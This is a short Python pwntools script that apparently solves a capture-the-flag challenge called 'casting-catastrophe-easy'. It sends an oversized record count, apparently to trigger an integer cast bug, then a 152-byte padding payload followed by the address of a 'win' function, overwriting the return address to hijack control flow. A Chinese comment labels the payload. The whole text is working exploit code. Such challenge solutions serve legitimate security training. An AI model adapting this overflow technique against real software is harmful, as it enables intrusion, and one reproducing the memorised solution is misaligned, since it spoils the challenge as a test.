#!/usr/bin/env python3
from pwn import *

context.log_level = "warning"

binary_path = "/challenge/casting-catastrophe-easy"
exe = ELF(binary_path, checksec=False)

p = process(binary_path)

record_num = b"42949673"
record_size = b"100"

p.sendline(record_num)
p.sendline(record_size)

# 构造 Payload：152 bytes padding + win function address
padding = 152
payload = b"\x90" * padding + p64(exe.sym["win"])

p.send(payload)
p.interactive()
